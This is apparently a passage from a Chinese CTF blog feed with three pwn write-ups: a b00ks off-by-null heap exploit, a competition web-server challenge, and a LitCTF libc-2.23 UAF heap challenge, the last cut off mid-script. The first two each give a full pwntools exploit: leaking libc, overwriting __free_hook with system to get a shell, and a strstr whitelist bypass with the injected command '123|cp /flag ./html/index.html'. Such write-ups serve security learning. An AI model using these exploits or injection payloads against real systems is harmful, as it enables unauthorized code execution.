        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一篇题解，针对off_by_null漏洞的攻击</p><blockquote><p><a href="https://www.52pojie.cn/thread-1825637-1-1.html">https://www.52pojie.cn/thread-1825637-1-1.html</a></p></blockquote><p>参考的这个博客</p><p>网上的题解一般是两种方法，一个是mmap泄漏libc地址，一个是unsorted bin泄漏libc</p><p>本篇是unsorted bin泄漏libc</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>漏洞点在read_n函数里面</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">read_n</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">read</span>(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;                                      <span class="comment">// off by null</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现这里有一个off by one+off by null，在实际调用中，a2的值一般是n-1,因此off by one就没有了，只有off by null</p><p>bss段里面可以发现，name_ptr只有32个字节，之后紧跟着book_menu，也就是说我们可以通过name_ptr最后的off_by_null字节来修改第一个堆块指针的低字节。</p><p>每个book_menu里面存储是一个结构体的指针,结构体具体是这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct book</span><br><span class="line">&#123;</span><br><span class="line">  int id;</span><br><span class="line">  char *book_name;</span><br><span class="line">  char *book_description;</span><br><span class="line">  int description_size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在ida里面使用shift+F1,在右键插入就可以自己定义结构体了，之后在需要修改的变量那里按y修改成book* a即可。</p><p>我们之前已经学过一种泄漏libc的方法，让一个不是fastbin大小的堆块释放，就会落到unsorted bin里面，这时候里面的fd和bk就是unsorted bin地址，可以通过这个来泄露出libc地址</p><p>get shell的方式我们之前也学过了，通过修改__free_hook为system，然后free掉一个&#x2F;bin&#x2F;sh\x00的块就可以了</p><p>我的exp贴出来、</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_size,book_name,des_size,des</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">    sla(<span class="string">&quot;(Max 32 chars): &quot;</span>,book_name)</span><br><span class="line">    sla(<span class="string">&quot;Enter book description size: &quot;</span>,<span class="built_in">str</span>(des_size))</span><br><span class="line">    sla(<span class="string">&quot;Enter book description: &quot;</span>,des)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;you want to delete: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,des</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;id you want to edit: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    sla(<span class="string">&quot;Enter new book description: &quot;</span>,des)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_name</span>(<span class="params">name</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter author name: &quot;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./b00ks&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25242</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;name:&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x12C3)&#x27;)</span></span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&quot;my_first&quot;</span>,<span class="number">0xa0</span>,<span class="string">&quot;the_des&quot;</span>)</span><br><span class="line">printf()</span><br><span class="line">ru(<span class="string">&quot;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">heap_addr=uu64(p.recv(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&quot;heap_addr&quot;</span>,heap_addr)</span><br><span class="line">heap_base = heap_addr - <span class="number">0x11b0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;bbbbbbbb&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;bbbbbbbb&quot;</span>)<span class="comment">#id 2</span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>) <span class="comment">#id 3</span></span><br><span class="line"><span class="comment"># heap+0x1210是id=2的des块</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x12C3)&#x27;)</span></span><br><span class="line"><span class="comment">#0x634922eaa330</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">1</span>)+p64(heap_base+<span class="number">0x1210</span>)+p64(heap_base+<span class="number">0x1340</span>)+p64(<span class="number">0x1000</span>))</span><br><span class="line">read_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">printf()</span><br><span class="line">ru(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">libc_leak=uu64(p.recv(<span class="number">6</span>))</span><br><span class="line">libc_base=libc_leak-<span class="number">0x3c4b78</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#+0x10</span></span><br><span class="line">leak(<span class="string">&quot;system&quot;</span>,libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x12C3)&#x27;)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x20&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">ti()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里分为几个步骤，首先泄漏heap地址，之后利用泄漏的heap地址来泄漏libc地址，之后再改free_hook最后get shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sla(<span class="string">&quot;name:&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&quot;my_first&quot;</span>,<span class="number">0xa0</span>,<span class="string">&quot;the_des&quot;</span>)</span><br><span class="line">printf()</span><br><span class="line">ru(<span class="string">&quot;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">heap_addr=uu64(p.recv(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&quot;heap_addr&quot;</span>,heap_addr)</span><br></pre></td></tr></table></figure><p>由于作者后面紧跟着就是第一个堆块的地址，因此我们先发送32个a来填满name这一块，此时\x00会放在堆地址处，我们再创建第一个堆块，就会覆盖掉之前写的\x00，那么name后面就不会有\x00，而可以在printf后面直接泄漏出第一个堆块地址</p><p>这里在创建第一个堆块的时候还要考虑好名字和描述的堆块大小，要让描述块的指针正好落在低字节为\x00，book_menu的指针落在描述块后面，但倒数第二个字节要一致。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;bbbbbbbb&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;bbbbbbbb&quot;</span>)<span class="comment">#id 2</span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>) <span class="comment">#id 3</span></span><br><span class="line"><span class="comment"># heap+0x1210是id=2的des块</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x12C3)&#x27;)</span></span><br><span class="line"><span class="comment">#0x634922eaa330</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">1</span>)+p64(heap_base+<span class="number">0x1210</span>)+p64(heap_base+<span class="number">0x1340</span>)+p64(<span class="number">0x1000</span>))</span><br><span class="line">read_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">printf()</span><br><span class="line">ru(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">libc_leak=uu64(p.recv(<span class="number">6</span>))</span><br><span class="line">libc_base=libc_leak-<span class="number">0x3c4b78</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br></pre></td></tr></table></figure><p>之后我们创建两本书，id&#x3D;2时的描述块要不能落在fastbin里面。</p><p>我们再这里释放掉第二本书，那么描述块就会落在unsorted bin里面，此时第二本书的描述块的fd和bk就是unsorted bin的地址。</p><p>这个edit函数编辑的是描述块，我们之前已经刚好让描述块落在了\x00的地址，我们此时再利用off_by_null就会恰好把原本的book_menu第一个指针改成描述块的指针，那我们在改之前先编辑一下1号块的描述块，就能在之后的edit(1)中修改其他的堆块了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit(1,p64(1)+p64(heap_base+0x1210)+p64(heap_base+0x1340)+p64(0x1000))</span><br></pre></td></tr></table></figure><p>这里就是编辑1号块的描述块，让他伪造成一个book_menu结构。</p><p>其中heap_base+0x1210是2号块的描述块，heap_base+0x1340是3号块的book_menu块+0x10，也就刚好是描述块指针所在的地址。</p><p>read_name(b’a’*32)就是修改第一块book_menu的指针为2号块描述块的指针。此时2号块描述块已经被放在unsorted bin里面了，也就能泄漏出libc地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#+0x10</span></span><br><span class="line">leak(<span class="string">&quot;system&quot;</span>,libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x12C3)&#x27;)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x20&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p>我们此时再edit 1号块就是编辑3号块的book_menu结构体。我们直接把描述块指针本来在的位置改成free_hook的地址。然后再edit 3号块就相当于编辑free_hook。</p><p>这样我们就成功get shell。</p><h1 id="学到的知识"><a href="#学到的知识" class="headerlink" title="学到的知识"></a>学到的知识</h1><p>这里就再次巩固了一下如何泄漏libc地址以及如何get shell。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>领航杯2024决赛pwn</title>
      <link href="/2024/11/15/2024-11-15-%E9%A2%86%E8%88%AA%E6%9D%AF2024%E5%86%B3%E8%B5%9Bpwn/"/>
      <url>/2024/11/15/2024-11-15-%E9%A2%86%E8%88%AA%E6%9D%AF2024%E5%86%B3%E8%B5%9Bpwn/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我是菜狗，比赛场上没搞出来，赛后让pwn爹指导的</p><p>非传统pwn题，题目写了一个web服务器</p><p>如果我能多学一点web的东西是不是就能做出来了，赛场上连payload怎么写都不会</p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">in_whitelist</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> *needle[<span class="number">6</span>]; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  needle[<span class="number">5</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  needle[<span class="number">0</span>] = <span class="string">&quot;Blue&quot;</span>;</span><br><span class="line">  needle[<span class="number">1</span>] = <span class="string">&quot;Red&quot;</span>;</span><br><span class="line">  needle[<span class="number">2</span>] = <span class="string">&quot;Yellow&quot;</span>;</span><br><span class="line">  needle[<span class="number">3</span>] = <span class="string">&quot;Green&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, needle[i]) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个白名单绕过，可以看到是strstr函数，并不是strcmp</p><p>不了解strstr这个函数，以为和strcmp是一样的</p><h2 id="strstr函数"><a href="#strstr函数" class="headerlink" title="strstr函数"></a>strstr函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strstr 函数是 C 标准库中的一个字符串处理函数，它的作用是 查找一个子字符串在另一个字符串中第一次出现的位置。具体来说，strstr 会返回目标字符串中第一次出现子字符串的位置，如果未找到子字符串，则返回 NULL。</span><br></pre></td></tr></table></figure><h3 id="函数原型："><a href="#函数原型：" class="headerlink" title="函数原型："></a>函数原型：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strstr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *haystack, <span class="type">const</span> <span class="type">char</span> *needle)</span>;</span><br></pre></td></tr></table></figure><h3 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h3><ul><li>**<code>haystack</code>**：要搜索的目标字符串。</li><li>**<code>needle</code>**：要查找的子字符串。</li></ul><h3 id="返回值："><a href="#返回值：" class="headerlink" title="返回值："></a>返回值：</h3><ul><li>如果在 <code>haystack</code> 中找到 <code>needle</code>，<code>strstr</code> 返回指向 <code>haystack</code> 中首次匹配位置的指针。</li><li>如果未找到 <code>needle</code>，则返回 <code>NULL</code>。</li></ul><p>简单来说只要有这个子字符串就行，就不会返回null。</p><h2 id="继续分析"><a href="#继续分析" class="headerlink" title="继续分析"></a>继续分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rep_dispatcher</span><span class="params">(<span class="type">const</span> <span class="type">char</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v3)(<span class="type">const</span> <span class="type">char</span> **); <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = rpm_list;</span><br><span class="line">  <span class="keyword">if</span> ( !in_whitelist(*a1) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  <span class="keyword">if</span> ( dword_604D10 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">strlen</span>(*v4);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(*a1, *v4, v2) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = *(v4 + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = *(v4 + <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3(a1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_16:</span><br><span class="line">    <span class="keyword">if</span> ( **a1 )</span><br><span class="line">      bomb1(a1);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      index_html(a1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中rpm_list中有我们的gift，那这样我们请求的路由就很明显了，前四个字符是gift，后面随便跟着Blue或者Red什么的都可以。</p><p>后面的gift函数里面也是唬人的。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">getPassword</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcat</span>(a2, <span class="string">&quot;p-&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(((i &lt;&lt; <span class="number">7</span>) + <span class="number">6308480</span>));</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(a1, &amp;users[<span class="number">128</span> * i], v2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncat</span>(a2, &amp;users[<span class="number">128</span> * i + <span class="number">64</span>], <span class="number">0x18uLL</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键就是这里的getpassword函数，只有这个是程序算的，其他的我们都能随便绕。</p><p>很显然这里要求我们用户名和系统里的相等才会在password后面连接其他的字符串，但是我们完全不必让用户名和系统的相等，随便写一个就行了，最后password就只有p-</p><p>还有最后的getshell的地方</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( cmd )</span><br><span class="line">      &#123;</span><br><span class="line">        fd = <span class="built_in">open</span>(<span class="string">&quot;html/congratulation.html&quot;</span>, <span class="number">114</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="built_in">read</span>(fd, &amp;dest[n], <span class="number">104857600</span> - n); i &gt; <span class="number">0</span>; i = <span class="built_in">read</span>(fd, &amp;dest[n], <span class="number">104857600</span> - n) )</span><br><span class="line">          n += i;</span><br><span class="line">        <span class="built_in">snprintf</span>(command, <span class="number">0xC8uLL</span>, <span class="string">&quot;echo %s&quot;</span>, cmd);</span><br><span class="line">        <span class="built_in">system</span>(command);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是在你给的cmd前面加上一个echo，那样我们可以使用管道符来绕过这里，比如 <code>123|</code></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>pwn爹给的exp，我只是稍微改了一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ru = <span class="keyword">lambda</span> a: io.recvuntil(a, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> n:io.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl= <span class="keyword">lambda</span> a: io.sendline(a)</span><br><span class="line">s = <span class="keyword">lambda</span> a: io.send(a)</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">5777</span>)</span><br><span class="line">payload = <span class="string">b&#x27;GET /giftBlue HTTP/1.1&#x27;</span></span><br><span class="line">username = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">password = <span class="string">b&#x27;p-&#x27;</span></span><br><span class="line">token = <span class="string">b&#x27;token-FierceDragon25bba&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;?username=&#x27;</span>+username</span><br><span class="line">payload += <span class="string">b&#x27;&amp;password=&#x27;</span>+password</span><br><span class="line">payload += <span class="string">b&#x27;&amp;token=&#x27;</span>+token</span><br><span class="line">payload += <span class="string">b&#x27;&amp;cmd=123|cp /flag ./html/index.html&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>最后拿浏览器访问一下就可以了</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF 2024 heap-2.23</title>
      <link href="/2024/11/15/2024-11-15-LitCTF%202024%20heap-2.23/"/>
      <url>/2024/11/15/2024-11-15-LitCTF%202024%20heap-2.23/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p><a href="https://www.nssctf.cn/problem/5614">https://www.nssctf.cn/problem/5614</a></p></blockquote><p>libc2.23版本的堆题，非常简单，但是是我自己独立完成的非教程题目的第一个题</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>菜单题，增删查改一应俱全</p><p>有UAF漏洞，申请的堆块大小自己设定</p><p>有UAF的话我们就可以很轻松的泄漏出libc，首先申请一个非fastbin大小的堆块，比如malloc(0x80)</p><p>delete一下它，然后show一下就可以得到unsorted bin地址，也就能知道libc地址</p><p>我之后的思路是利用uaf漏洞来Arbitrary Alloc，利用fastbin单向链表的性质，通过字节错位的方法来申请到<code>__malloc_hook</code>所在的空间。</p><p>然后再改写__malloc_hook到one_gadget就行了。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx,size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx? &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size? &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx? &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx? &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx? &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;content : \n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./heap&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28015</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x00</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* 0x400D25&#x27;)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;content : &quot;</span>)</span><br><span class="line">libc_leak=uu64(p.recv(<span class="number">6</span>))</span><br><span class="line">leak(<span 